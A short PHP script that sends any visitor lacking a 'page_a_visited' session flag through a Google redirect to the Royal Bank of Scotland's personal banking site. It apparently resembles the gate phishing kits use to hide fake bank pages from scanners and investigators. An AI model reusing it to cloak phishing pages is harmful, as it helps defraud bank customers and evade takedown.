<?php
session_start();
if(!isset($_SESSION['page_a_visited'])){
        header("Location: https://www.google.ie/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwj5w4vEuanLAhUGuRQKHYd_D4MQFggbMAA&url=http%3A%2F%2Fpersonal.rbs.co.uk%2F&usg=AFQjCNFYepvxIdwo2Mjnx1bPJfbEHs3vQw&bvm=bv.116274245,d.d24");
		die();

}
?>